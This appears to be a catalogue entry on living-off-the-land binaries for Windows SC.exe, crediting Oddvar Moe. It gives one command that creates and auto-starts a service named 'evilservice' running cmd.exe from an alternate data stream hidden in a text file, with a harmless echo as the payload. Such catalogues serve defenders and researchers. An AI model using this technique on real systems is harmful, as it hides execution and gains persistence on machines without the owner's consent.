---
Name: SC.exe
Description: Execute, Read ADS, Create Service, Start Service
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: "sc create evilservice binPath= \"\\\"c:\\ADS\\file.txt:cmd.exe\\\" /c\
      \ echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start=\
      \ auto     \nsc start evilservice"
    Description: ''
  - Command: ''
    Description: ''
Full Path:
  - c:\windows\system32\sc.exe
  - c:\windows\sysWOW64\sc.exe
Code Sample: []
Detection: []
Resources:
  - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
Notes: Thanks to Oddvar Moe - @oddvarmoe
---